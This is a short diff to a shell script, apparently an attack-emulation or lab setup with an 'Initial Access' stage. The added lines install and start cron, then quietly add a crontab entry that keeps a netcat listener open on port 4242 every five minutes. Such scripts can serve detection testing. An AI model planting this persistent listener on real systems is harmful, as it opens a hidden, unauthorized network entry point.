@@ -2,7 +2,10 @@
 
 # General
 apt-get update -y
-apt-get install wget netcat -y
+apt-get install wget netcat cron -y
+service cron start
+
+(crontab -l ; echo "*/5 * * * * sleep 1 && /bin/bash -c 'nc -nvlp 4242'")|crontab 2> /dev/null
 
 #[Initial Access]
 mkdir /tmp/1_InitialAccess
